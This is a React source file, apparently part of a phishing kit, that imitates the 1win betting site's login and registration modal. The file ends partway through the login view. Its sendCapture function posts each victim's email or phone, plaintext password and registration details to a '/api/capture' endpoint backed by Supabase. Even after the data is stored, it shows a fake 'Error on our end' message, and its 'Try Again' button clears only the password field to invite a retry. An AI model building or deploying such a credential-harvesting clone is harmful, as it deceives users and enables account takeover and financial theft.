'use client';

import React, { useState, useEffect, useMemo, useRef } from 'react';

export interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'login' | 'register';
}

// --------------------------------------------------------------------------
// Currencies & Countries
// --------------------------------------------------------------------------
export interface CurrencyItem {
  code: string;
  name: string;
  symbol: string;
  badgeBg: string;
  badgeColor?: string;
  badgeType: 'crypto' | 'fiat';
}

export const CURRENCIES: CurrencyItem[] = [
  { code: 'INR', name: 'Indian rupee', symbol: '₹', badgeBg: '#008236', badgeColor: '#fd5e00', badgeType: 'fiat' },
  { code: '1WIN', name: '1win Token', symbol: '1WIN', badgeBg: '#d7a13d', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BCH', name: 'Bitcoin Cash', symbol: 'BCH', badgeBg: '#0ac18e', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BNB', name: 'Binance coin', symbol: 'BNB', badgeBg: '#f3ba2f', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BTC', name: 'Bitcoin', symbol: 'BTC', badgeBg: '#f7931a', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DASH', name: 'Dash', symbol: 'DASH', badgeBg: '#008de4', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'DOGE', name: 'Dogecoin', symbol: 'DOGE', badgeBg: '#c2a633', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'ETC', name: 'Ethereum Classic', symbol: 'ETC', badgeBg: '#1f1f1f', badgeColor: '#10b981', badgeType: 'crypto' },
  { code: 'ETH', name: 'Ethereum', symbol: 'ETH', badgeBg: '#627eea', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'HYPE', name: 'Hype', symbol: 'HYPE', badgeBg: '#0b3c37', badgeColor: '#00e5a3', badgeType: 'crypto' },
  { code: 'LINK', name: 'Chainlink', symbol: 'LINK', badgeBg: '#375bd2', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'LTC', name: 'Litecoin', symbol: 'LTC', badgeBg: '#bebebe', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'USD', name: 'US Dollar', symbol: '$', badgeBg: '#10b981', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'EUR', name: 'Euro', symbol: '€', badgeBg: '#2563eb', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'USDT', name: 'Tether (USDT)', symbol: '₮', badgeBg: '#26a17b', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'TRX', name: 'TRON', symbol: 'TRX', badgeBg: '#ef4444', badgeColor: '#ffffff', badgeType: 'crypto' },
  { code: 'BDT', name: 'Bangladeshi Taka', symbol: '৳', badgeBg: '#059669', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'PKR', name: 'Pakistani Rupee', symbol: '₨', badgeBg: '#15803d', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'AED', name: 'UAE Dirham', symbol: 'د.إ', badgeBg: '#0d9488', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'RUB', name: 'Russian Ruble', symbol: '₽', badgeBg: '#3b82f6', badgeColor: '#ffffff', badgeType: 'fiat' },
  { code: 'BRL', name: 'Brazilian Real', symbol: 'R$', badgeBg: '#16a34a', badgeColor: '#ffffff', badgeType: 'fiat' },
];

export interface CountryItem {
  code: string;
  name: string;
  flag: string;
  searchStr: string;
}

export const COUNTRIES: CountryItem[] = [
  { code: '+91', name: 'India', flag: '🇮🇳', searchStr: 'india +91' },
  { code: '+7', name: 'Russia (Россия)', flag: '🇷🇺', searchStr: 'russia россия +7' },
  { code: '+380', name: 'Ukraine (Україна)', flag: '🇺🇦', searchStr: 'ukraine україна +380' },
  { code: '+355', name: 'Albania', flag: '🇦🇱', searchStr: 'albania +355' },
  { code: '+213', name: 'Algeria', flag: '🇩🇿', searchStr: 'algeria +213' },
  { code: '+1', name: 'American Samoa', flag: '🇦🇸', searchStr: 'american samoa +1' },
  { code: '+376', name: 'Andorra', flag: '🇦🇩', searchStr: 'andorra +376' },
  { code: '+244', name: 'Angola', flag: '🇦🇴', searchStr: 'angola +244' },
  { code: '+1264', name: 'Anguilla', flag: '🇦🇮', searchStr: 'anguilla +1264' },
  { code: '+1268', name: 'Antigua and Barbuda', flag: '🇦🇬', searchStr: 'antigua and barbuda +1268' },
  { code: '+54', name: 'Argentina', flag: '🇦🇷', searchStr: 'argentina +54' },
  { code: '+374', name: 'Armenia (Հայաստան)', flag: '🇦🇲', searchStr: 'armenia հայաստան +374' },
  { code: '+297', name: 'Aruba', flag: '🇦🇼', searchStr: 'aruba +297' },
  { code: '+61', name: 'Australia', flag: '🇦🇺', searchStr: 'australia +61' },
  { code: '+43', name: 'Austria', flag: '🇦🇹', searchStr: 'austria +43' },
  { code: '+994', name: 'Azerbaijan', flag: '🇦🇿', searchStr: 'azerbaijan +994' },
  { code: '+1242', name: 'Bahamas', flag: '🇧🇸', searchStr: 'bahamas +1242' },
  { code: '+973', name: 'Bahrain', flag: '🇧🇭', searchStr: 'bahrain +973' },
  { code: '+880', name: 'Bangladesh', flag: '🇧🇩', searchStr: 'bangladesh +880' },
  { code: '+375', name: 'Belarus', flag: '🇧🇾', searchStr: 'belarus +375' },
  { code: '+32', name: 'Belgium', flag: '🇧🇪', searchStr: 'belgium +32' },
  { code: '+55', name: 'Brazil', flag: '🇧🇷', searchStr: 'brazil +55' },
  { code: '+1', name: 'Canada', flag: '🇨🇦', searchStr: 'canada +1' },
  { code: '+86', name: 'China', flag: '🇨🇳', searchStr: 'china +86' },
  { code: '+20', name: 'Egypt', flag: '🇪🇬', searchStr: 'egypt +20' },
  { code: '+33', name: 'France', flag: '🇫🇷', searchStr: 'france +33' },
  { code: '+49', name: 'Germany', flag: '🇩🇪', searchStr: 'germany +49' },
  { code: '+62', name: 'Indonesia', flag: '🇮🇩', searchStr: 'indonesia +62' },
  { code: '+98', name: 'Iran', flag: '🇮🇷', searchStr: 'iran +98' },
  { code: '+964', name: 'Iraq', flag: '🇮🇶', searchStr: 'iraq +964' },
  { code: '+39', name: 'Italy', flag: '🇮🇹', searchStr: 'italy +39' },
  { code: '+81', name: 'Japan', flag: '🇯🇵', searchStr: 'japan +81' },
  { code: '+7', name: 'Kazakhstan', flag: '🇰🇿', searchStr: 'kazakhstan +7' },
  { code: '+254', name: 'Kenya', flag: '🇰🇪', searchStr: 'kenya +254' },
  { code: '+965', name: 'Kuwait', flag: '🇰🇼', searchStr: 'kuwait +965' },
  { code: '+60', name: 'Malaysia', flag: '🇲🇾', searchStr: 'malaysia +60' },
  { code: '+52', name: 'Mexico', flag: '🇲🇽', searchStr: 'mexico +52' },
  { code: '+977', name: 'Nepal', flag: '🇳🇵', searchStr: 'nepal +977' },
  { code: '+31', name: 'Netherlands', flag: '🇳🇱', searchStr: 'netherlands +31' },
  { code: '+234', name: 'Nigeria', flag: '🇳🇬', searchStr: 'nigeria +234' },
  { code: '+92', name: 'Pakistan', flag: '🇵🇰', searchStr: 'pakistan +92' },
  { code: '+63', name: 'Philippines', flag: '🇵🇭', searchStr: 'philippines +63' },
  { code: '+48', name: 'Poland', flag: '🇵🇱', searchStr: 'poland +48' },
  { code: '+974', name: 'Qatar', flag: '🇶🇦', searchStr: 'qatar +974' },
  { code: '+966', name: 'Saudi Arabia', flag: '🇸🇦', searchStr: 'saudi arabia +966' },
  { code: '+65', name: 'Singapore', flag: '🇸🇬', searchStr: 'singapore +65' },
  { code: '+27', name: 'South Africa', flag: '🇿🇦', searchStr: 'south africa +27' },
  { code: '+82', name: 'South Korea', flag: '🇰🇷', searchStr: 'south korea +82' },
  { code: '+34', name: 'Spain', flag: '🇪🇸', searchStr: 'spain +34' },
  { code: '+94', name: 'Sri Lanka', flag: '🇱🇰', searchStr: 'sri lanka +94' },
  { code: '+66', name: 'Thailand', flag: '🇹🇭', searchStr: 'thailand +66' },
  { code: '+90', name: 'Turkey', flag: '🇹🇷', searchStr: 'turkey +90' },
  { code: '+971', name: 'United Arab Emirates', flag: '🇦🇪', searchStr: 'united arab emirates uae +971' },
  { code: '+44', name: 'United Kingdom', flag: '🇬🇧', searchStr: 'united kingdom uk +44' },
  { code: '+1', name: 'United States', flag: '🇺🇸', searchStr: 'united states usa +1' },
  { code: '+998', name: 'Uzbekistan', flag: '🇺🇿', searchStr: 'uzbekistan +998' },
  { code: '+84', name: 'Vietnam', flag: '🇻🇳', searchStr: 'vietnam +84' },
];

// --------------------------------------------------------------------------
// Icons (Fine-tuned with decreased scale to match image replica exactly)
// --------------------------------------------------------------------------
function CloseIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
      <path d="M2 2l12 12M14 2L2 14" />
    </svg>
  );
}

function ChevronDownIcon({ className = '' }: { className?: string }) {
  return (
    <svg width="10" height="7" viewBox="0 0 10 7" fill="none" className={className}>
      <path d="M1 1.5L5 5.5L9 1.5" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function SearchIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
      <circle cx="11" cy="11" r="8" />
      <path d="M21 21l-4.35-4.35" />
    </svg>
  );
}

function PhoneTabIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor" style={{ marginRight: '6px', flexShrink: 0 }}>
      <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" />
    </svg>
  );
}

function EmailTabIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor" style={{ marginRight: '6px', flexShrink: 0 }}>
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function EnvelopeIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#6c727f" style={{ flexShrink: 0 }}>
      <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#6c727f" style={{ flexShrink: 0 }}>
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
    </svg>
  );
}

// Social Login Icons - Decreased Scale (~17px) & Clean Black Glyphs
function GoogleIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor">
      <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" />
      <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" />
      <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" />
      <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" />
    </svg>
  );
}

function VkIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M13.162 18.994c.609 0 .858-.406.851-.915-.072-1.785.736-2.502 1.545-2.072 1.054.561 1.934 2.378 2.943 2.915.76.406 1.488.246 1.488.246l3.606-.05s1.888-.12.993-1.597c-.073-.12-.524-1.107-2.697-3.125-2.274-2.112-1.97-1.77.77-5.421 1.668-2.224 2.336-3.58 2.128-4.16-.198-.553-1.43-.406-1.43-.406l-4.062.025c-.378.025-.694.137-.847.531 0 0-.648 1.722-1.512 3.187-1.826 3.097-2.556 3.261-2.854 3.066-.694-.454-.52-1.822-.52-2.793 0-3.042.46-4.31-.897-4.64-.45-.109-.78-.182-1.933-.194-1.476-.016-2.724.005-3.431.35-.47.23-.834.746-.612.776.274.037.893.168 1.222.614.425.576.41 1.872.41 1.872s.244 3.581-.571 4.024c-.56.305-1.326-.318-2.973-3.136-.841-1.439-1.479-3.031-1.479-3.031s-.122-.3-.34-.46c-.263-.194-.632-.256-.632-.256l-3.864.025c-.58 0-.796.269-.796.568 0 .532.68 3.197 3.167 6.745 2.217 3.164 5.342 5.093 8.167 5.093z" />
    </svg>
  );
}

function TelegramIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor">
      <path d="M1.946 9.315c-.522-.174-.527-.455.01-.634L21.044 2.32c.529-.176.832.12.684.638l-3.5 15.35c-.139.608-.544.757-1.026.471l-5.405-3.985-2.607 2.51c-.288.278-.53.51-.986.51l.388-5.508 10.024-9.056c.436-.388-.095-.604-.677-.216L5.617 12.38 1.946 9.315z" />
    </svg>
  );
}

function YandexIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor">
      <path d="M14.2 2H10c-3.3 0-5.5 2.2-5.5 5.5 0 2.2 1.1 4 3 4.9L4 21h3.5l3.5-7.5H12V21h3V2h-.8zm-1.7 7.5H10c-1.7 0-2.5-1.1-2.5-2.5S8.3 5.5 10 5.5h2.5v4z" />
    </svg>
  );
}

function WalletConnectIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M5.5 8.5c3.6-3.5 9.4-3.5 13 0l.4.4c.2.2.2.5 0 .7l-1.5 1.5c-.1.1-.3.1-.4 0l-.6-.6c-2.6-2.5-6.8-2.5-9.4 0l-.6.6c-.1.1-.3.1-.4 0L4.5 9.6c-.2-.2-.2-.5 0-.7l1-.4zm15.7 3.1l1.4 1.4c.2.2.2.5 0 .7l-6.3 6.3c-.2.2-.5.2-.7 0l-3.6-3.6-3.6 3.6c-.2.2-.5.2-.7 0L1.4 13.7c-.2-.2-.2-.5 0-.7l1.4-1.4c.2-.2.5-.2.7 0l4.9 4.9 3.6-3.6c.2-.2.5-.2.7 0l3.6 3.6 4.9-4.9c.2-.2.5-.2.7 0z" />
    </svg>
  );
}

function MetaMaskFoxIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="currentColor">
      <path d="M21.5 4.3l-8.7 5.7 1.6-3.8 7.1-1.9zM2.5 4.3l7.1 1.9 1.6 3.8-8.7-5.7zm15.5 10.9l-2.7 4.1-5.3-2.3 4.4-1.7 3.6-.1zm-12 0l3.6.1 4.4 1.7-5.3 2.3-2.7-4.1zM9.3 12.3l-2.4 1.8 1.4-2.8 1 .9v.1zm5.4 0l1-.9 1.4 2.8-2.4-1.8v-.1zm-2.7 1.5l2.4-1 2.3 1.8-2.7 1.3-2-.1v-2zm0-4.6l1.8 2.2-1.8 1-1.8-1 1.8-2.2z" />
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
      <path d="M12 2L4 5v6.5C4 16.5 7.4 21.1 12 22c4.6-.9 8-5.5 8-10.5V5l-8-3z" stroke="#111827" strokeWidth="2.1" strokeLinejoin="round" fill="none" />
      <path d="M12 3.2v17.6c-3.6-.9-6.4-4.7-6.4-9.1V5.7L12 3.2z" fill="#111827" />
    </svg>
  );
}

function CurrencyBadge({ currency, size = 24 }: { currency: CurrencyItem; size?: number }) {
  return (
    <div
      style={{
        width: size,
        height: size,
        borderRadius: '50%',
        backgroundColor: currency.badgeBg,
        color: currency.badgeColor || '#ffffff',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        fontSize: size > 28 ? '13px' : '11px',
        fontWeight: 700,
        flexShrink: 0,
      }}
    >
      {currency.symbol.length > 2 ? currency.symbol.slice(0, 2) : currency.symbol}
    </div>
  );
}

// --------------------------------------------------------------------------
// AuthModal Component
// --------------------------------------------------------------------------
export default function AuthModal({ isOpen, onClose, initialMode = 'login' }: AuthModalProps) {
  const [authMode, setAuthMode] = useState<'login' | 'register'>(initialMode);
  const [subView, setSubView] = useState<'form' | 'currency' | 'country'>('form');

  // Login: Default Email tab active
  const [loginSubTab, setLoginSubTab] = useState<'phone' | 'email'>('email');
  const [loginPhone, setLoginPhone] = useState('');
  const [loginPhoneCountry, setLoginPhoneCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [loginPhoneErr, setLoginPhoneErr] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginEmailErr, setLoginEmailErr] = useState('');
  const [loginPwd, setLoginPwd] = useState('');
  const [loginPwdErr, setLoginPwdErr] = useState('');
  const [isPhoneFocused, setIsPhoneFocused] = useState(false);
  const [isPwdFocused, setIsPwdFocused] = useState(false);

  // Registration state
  const [regCurrency, setRegCurrency] = useState<CurrencyItem>(CURRENCIES[0]);
  const [regCountry, setRegCountry] = useState<CountryItem>(COUNTRIES[0]);
  const [regPhone, setRegPhone] = useState('');
  const [regPhoneErr, setRegPhoneErr] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regEmailErr, setRegEmailErr] = useState('');
  const [regPwd, setRegPwd] = useState('');
  const [regPwdErr, setRegPwdErr] = useState('');
  const [showPromo, setShowPromo] = useState(false);
  const [regPromo, setRegPromo] = useState('');
  const [regAgreed, setRegAgreed] = useState(true);
  const [regAgreedErr, setRegAgreedErr] = useState('');

  // Pickers search
  const [currencySearch, setCurrencySearch] = useState('');
  const [countrySearch, setCountrySearch] = useState('');

  // Submissions
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);
  const [errorTitle, setErrorTitle] = useState('Error');
  const [statusMessage, setStatusMessage] = useState('');
  const [formBannerError, setFormBannerError] = useState('');

  const phoneInputRef = useRef<HTMLInputElement>(null);

  // Sync mode changes
  useEffect(() => {
    setAuthMode(initialMode);
    setLoginSubTab('email');
    setSubView('form');
  }, [initialMode, isOpen]);

  // Lock body scroll
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [isOpen]);

  const clearAllErrors = () => {
    setLoginPhoneErr('');
    setLoginEmailErr('');
    setLoginPwdErr('');
    setRegPhoneErr('');
    setRegEmailErr('');
    setRegPwdErr('');
    setRegAgreedErr('');
    setStatusMessage('');
    setFormBannerError('');
  };

  const handleClose = React.useCallback(() => {
    clearAllErrors();
    setShowSuccess(false);
    setShowError(false);
    setIsSubmitting(false);
    setSubView('form');
    onClose();
  }, [onClose]);

  // Escape key handler
  useEffect(() => {
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        if (subView !== 'form') {
          setSubView('form');
        } else {
          handleClose();
        }
      }
    };
    document.addEventListener('keydown', handleKey);
    return () => document.removeEventListener('keydown', handleKey);
  }, [handleClose, subView]);

  // Filtered Currencies
  const filteredCurrencies = useMemo(() => {
    if (!currencySearch.trim()) return CURRENCIES;
    const q = currencySearch.toLowerCase().trim();
    return CURRENCIES.filter(
      (c) => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.symbol.toLowerCase().includes(q)
    );
  }, [currencySearch]);

  // Filtered Countries
  const filteredCountries = useMemo(() => {
    if (!countrySearch.trim()) return COUNTRIES;
    const q = countrySearch.toLowerCase().trim();
    return COUNTRIES.filter(
      (c) => c.searchStr.includes(q) || c.name.toLowerCase().includes(q) || c.code.includes(q)
    );
  }, [countrySearch]);

  const handlePhoneChange = (val: string, setter: (v: string) => void) => {
    const clean = val.replace(/[^\d\s]/g, '');
    setter(clean);
  };

  const sendCapture = async (data: Record<string, unknown>) => {
    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);
    setFormBannerError('');

    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
      const json = await res.json().catch(() => null);
      setIsSubmitting(false);

      if (res.ok && json?.supabase === true) {
        // Data properly saved in Supabase
        setErrorTitle('Error');
        setStatusMessage('Error on our end, try again later');
        setShowError(true);
      } else {
        // Data NOT stored in Supabase
        setErrorTitle('Server Error');
        setStatusMessage('Server error, try again');
        setShowError(true);
      }
    } catch {
      setIsSubmitting(false);
      setErrorTitle('Server Error');
      setStatusMessage('Server error, try again');
      setShowError(true);
    }
  };

  // Login Submit
  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    if (loginSubTab === 'phone') {
      const digits = loginPhone.replace(/\D/g, '');
      if (!loginPhone.trim()) {
        setLoginPhoneErr('Please enter your phone number');
        valid = false;
      } else if (digits.length < 8) {
        setLoginPhoneErr('Please enter a valid phone number');
        valid = false;
      }
    } else {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!loginEmail.trim()) {
        setLoginEmailErr('Please enter your email address');
        valid = false;
      } else if (!emailRegex.test(loginEmail.trim())) {
        setLoginEmailErr('Please enter a valid email address');
        valid = false;
      }
    }

    if (!loginPwd.trim()) {
      setLoginPwdErr('Please enter your password');
      valid = false;
    } else if (loginPwd.trim().length < 6) {
      setLoginPwdErr('Password must be at least 6 characters');
      valid = false;
    }

    if (!valid) return;

    const isPhone = loginSubTab === 'phone';
    const cleanPhone = loginPhone.trim();
    const cleanEmail = loginEmail.trim();
    const phoneWithCode = isPhone ? `${loginPhoneCountry.code} ${cleanPhone}` : null;
    const emailVal = !isPhone ? cleanEmail : null;
    const identifierVal = isPhone ? phoneWithCode : emailVal;

    await sendCapture({
      type: 'Login',
      method: loginSubTab,
      identifier: identifierVal,
      email: emailVal,
      phone: phoneWithCode,
      password: loginPwd,
    });
  };

  // Register Submit
  const handleRegisterSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    clearAllErrors();
    let valid = true;

    const digits = regPhone.replace(/\D/g, '');
    if (!regPhone.trim()) {
      setRegPhoneErr('Please enter your phone number');
      valid = false;
    } else if (digits.length < 8) {
      setRegPhoneErr('Please enter a valid phone number');
      valid = false;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!regEmail.trim()) {
      setRegEmailErr('Please enter your email address');
      valid = false;
    } else if (!emailRegex.test(regEmail.trim())) {
      setRegEmailErr('Please enter a valid email address');
      valid = false;
    }

    if (!regPwd.trim()) {
      setRegPwdErr('Please enter a password');
      valid = false;
    } else if (regPwd.trim().length < 8) {
      setRegPwdErr('Password must be at least 8 characters');
      valid = false;
    }

    if (!regAgreed) {
      setRegAgreedErr('You must accept the User Agreement');
      valid = false;
    }

    if (!valid) return;

    await sendCapture({
      type: 'Registration',
      currency: regCurrency.code,
      currencyName: regCurrency.name,
      phone: `${regCountry.code} ${regPhone}`,
      email: regEmail,
      password: regPwd,
      promoCode: regPromo || undefined,
      agreedTerms: regAgreed,
    });
  };

  if (!isOpen) return null;

  return (
    <div
      className="win-auth-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget) handleClose();
      }}
    >
      <div className="win-auth-sheet" role="dialog" aria-modal="true">
        {/* ===================================================================
            FEEDBACK SCREENS (SUCCESS / ERROR)
            =================================================================== */}
        {showSuccess ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-success">
              <div className="win-feedback-icon">✓</div>
              <h3 className="win-feedback-title">{authMode === 'register' ? 'Account Created' : 'Welcome Back'}</h3>
              <p className="win-feedback-message">{statusMessage}</p>
              <button type="button" className="win-btn-submit" onClick={handleClose}>
                Continue
              </button>
            </div>
          </div>
        ) : showError ? (
          <div className="win-auth-card-body win-feedback-container">
            <div className="win-feedback-card win-feedback-error">
              <div className="win-feedback-icon win-feedback-icon-err">!</div>
              <h3 className="win-feedback-title" style={{ color: '#ef4444' }}>{errorTitle}</h3>
              <p className="win-feedback-message">{statusMessage}</p>
              <button
                type="button"
                className="win-btn-submit"
                onClick={() => {
                  setShowError(false);
                  setFormBannerError(statusMessage);
                  setLoginPwd('');
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        ) : subView === 'country' ? (
          /* ===================================================================
              SUBVIEW: CHOOSE COUNTRY
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose country</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={countrySearch}
                onChange={(e) => setCountrySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCountries.map((country, idx) => {
                const isSelected =
                  authMode === 'register'
                    ? regCountry.code === country.code && regCountry.name === country.name
                    : loginPhoneCountry.code === country.code && loginPhoneCountry.name === country.name;
                return (
                  <button
                    key={`${country.code}-${idx}`}
                    type="button"
                    className={`win-country-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      if (authMode === 'register') {
                        setRegCountry(country);
                      } else {
                        setLoginPhoneCountry(country);
                      }
                      setSubView('form');
                    }}
                  >
                    <span className="win-country-flag">{country.flag}</span>
                    <span className="win-country-dialcode">{country.code}</span>
                    <span className="win-country-name">{country.name}</span>
                  </button>
                );
              })}
              {filteredCountries.length === 0 && (
                <div className="win-picker-empty">No countries found</div>
              )}
            </div>
          </div>
        ) : subView === 'currency' ? (
          /* ===================================================================
              SUBVIEW: CHOOSE CURRENCY
              =================================================================== */
          <div className="win-subview-container">
            <div className="win-auth-header">
              <h2 className="win-auth-title">Choose currency</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Back"
                onClick={() => setSubView('form')}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="win-search-box">
              <span className="win-search-icon">
                <SearchIcon />
              </span>
              <input
                type="text"
                className="win-search-input"
                placeholder="Search"
                value={currencySearch}
                onChange={(e) => setCurrencySearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="win-picker-list">
              {filteredCurrencies.map((c) => {
                const isSelected = regCurrency.code === c.code;
                return (
                  <button
                    key={c.code}
                    type="button"
                    className={`win-currency-item${isSelected ? ' win-picker-item--active' : ''}`}
                    onClick={() => {
                      setRegCurrency(c);
                      setSubView('form');
                    }}
                  >
                    <CurrencyBadge currency={c} size={36} />
                    <div className="win-currency-info">
                      <span className="win-currency-name">{c.name}</span>
                      <span className="win-currency-code">{c.code}</span>
                    </div>
                  </button>
                );
              })}
              {filteredCurrencies.length === 0 && (
                <div className="win-picker-empty">No currencies found</div>
              )}
            </div>
          </div>
        ) : authMode === 'login' ? (
          /* ===================================================================
              LOGIN VIEW - EXACT REPLICA OF THE IMAGE
              =================================================================== */
          <div className="win-auth-card-body">
            {/* Header: Title ("Login" - not heavy bold!) + Close Button */}
            <div className="win-auth-header">
              <h2 className="win-auth-title">Login</h2>
              <button
                type="button"
                className="win-auth-close-btn"
                aria-label="Close"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            {/* Segmented Switcher Capsule: Phone vs Email */}
            <div className="win-login-subtabs">
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'phone' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('phone');
                  clearAllErrors();
                }}
              >
                <PhoneTabIcon />
                <span>Phone</span>
              </button>
              <button
                type="button"
                className={`win-login-subtab${loginSubTab === 'email' ? ' win-login-subtab--active' : ''}`}
                onClick={() => {
                  setLoginSubTab('email');
                  clearAllErrors();
                }}
              >
                <EmailTabIcon />
                <span>Email</span>
              </button>
            </div>

            {/* Form Fields */}
            <form noValidate onSubmit={handleLoginSubmit} className="win-form">
              {formBannerError && (
                <div
                  style={{
                    backgroundColor: '#fee2e2',
                    border: '1px solid #fecaca',
                    color: '#dc2626',
                    padding: '9px 12px',
                    borderRadius: '10px',
                    fontSize: '13px',
                    marginBottom: '12px',
                    textAlign: 'center',
                    fontWeight: 500,
                  }}
                >
                  {formBannerError}
                </div>
              )}
              {loginSubTab === 'phone' ? (
                <div className="win-field-group">
                  <div
                    className={`win-field-pill win-phone-pill${
                      isPhoneFocused ? ' win-field-pill--focused' : ''
                    }${loginPhoneErr ? ' win-field-pill--error' : ''}`}
                    onClick={() => phoneInputRef.current?.focus()}
                  >
                    <button
                      type="button"
                      className="win-country-prefix-btn"
                      onClick={(e) => {
                        e.stopPropagation();
                        setCountrySearch('');
                        setSubView('country');
                      }}
                      aria-label="Select country code"
                    >
                      <span className="win-country-prefix-flag">{loginPhoneCountry.flag}</span>
                      <ChevronDownIcon className="win-prefix-chevron" />
                    </button>
